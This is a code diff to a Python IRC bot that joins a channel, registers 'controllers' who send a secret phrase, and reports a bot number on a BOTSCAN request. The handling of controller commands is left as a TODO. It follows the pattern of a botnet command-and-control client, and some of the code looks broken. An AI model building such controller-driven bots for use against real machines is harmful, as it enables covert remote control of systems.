@@ -1,13 +1,21 @@
 import sys, socket, time, threading, re
 import logging as log
 
+def scan_bots(channel):
+    print("Scanning bots in #" + channel + "...")
+    irc.sendall(bytearray('WHO #'+channel+'\n', 'utf-8'))
+    # receive list of current users in channel
+    data = irc.recv(2040)
+
+    return
+
 def establish_protocol(hostname, port, channel, secret):
-    sys.stderr.write("Sending IRC protocol messages...\n")
+    sys.stderr.write("Joining IRC channel...\n")
     # IRC server protocol
-    # TODO add bot number
-    irc.send(bytearray('NICK bot\n', 'utf-8'))
-    irc.send(bytearray('USER bot 0 * : bot\n', 'utf-8'))
-    irc.send(bytearray('JOIN #' + channel + '\n', 'utf-8'))
+    irc.sendall(bytearray('NICK bot\n', 'utf-8'))
+    irc.sendall(bytearray('USER bot_ * : bot\n', 'utf-8'))
+    irc.sendall(bytearray('JOIN #' + channel + '\n', 'utf-8'))
+
     return
 
 def receive_msg():
@@ -18,33 +26,30 @@ def receive_msg():
 
         # message_split[1] = Nickname
         message_split = re.split('!|:', message.decode('utf-8'))
-        print(message_split)
+        print(message.decode('utf-8'))
 
         # check for ping-pong message 
         if message.find(bytearray('PING', 'utf-8')) != -1:
             sys.stderr.write("Sending PONG "  + message_split[1] + "\n")
             irc.sendall(bytearray('PONG ' + message_split[1], 'utf-8'))
+
+        # if PRIVMSG from other channel
         elif len(message_split) == 4:
             # actual_message = Message received without escape characters
             actual_message = message_split[3].split()[0]
 
-            # check for secret phrase 
-            if (message_split[1] not in controllers) and (actual_message == secret_phrase):
+            if actual_message == 'BOTSCAN':
+                print("Bot scan request received. Sending bot number...")
+                irc.sendall(bytearray('PRIVMSG ' + message_split[1] + ' 0 * : ' + bot_num, 'utf-8'))
+            # authenticate unknown controller
+            elif (message_split[1] not in controllers) and (actual_message == secret_phrase):
                 sys.stderr.write(message_split[1] + " is a Controller!\n")
                 controllers.append(message_split[1])
                 irc.sendall(bytearray('PRIVMSG '+ message_split[1] + ' :hi from bot \n', 'utf-8'))
             elif message_split[1] in controllers:
-                sys.stderr.write("Message from controller\n")
+                sys.stderr.write("Message from controller "+ message_split[1] +"\n")
                 # TODO handle controller message here
         
-    return
-
-# TODO send messages to irc
-def send_msg():
-    while True:
-        message = input()
-        sys.stderr.write("Sending message to irc...\n")
-        irc.sendall(bytearray(message, 'utf-8'))
     return
 
 if __name__ == '__main__':
@@ -55,8 +60,10 @@ if __name__ == '__main__':
         channel = sys.argv[3]
         secret_phrase = sys.argv[4]
 
-        # Initialize list of authenticated controllers
+        # authenticated controllers
         controllers = []
+        # assume first bot
+        bot_num = 1
 
         # Connect to controller
         irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -66,7 +73,7 @@ if __name__ == '__main__':
                 sys.stderr.write("Attempting to connect to server...\n")
                 irc.connect((hostname, int(port)))
                 # establish irc protocol
-                sys.stderr.write("Connected to IRC!\n")
+                sys.stderr.write("Connected to server!\n")
                 establish_protocol(hostname, port, channel, secret_phrase)
                
                 #start receiving thread
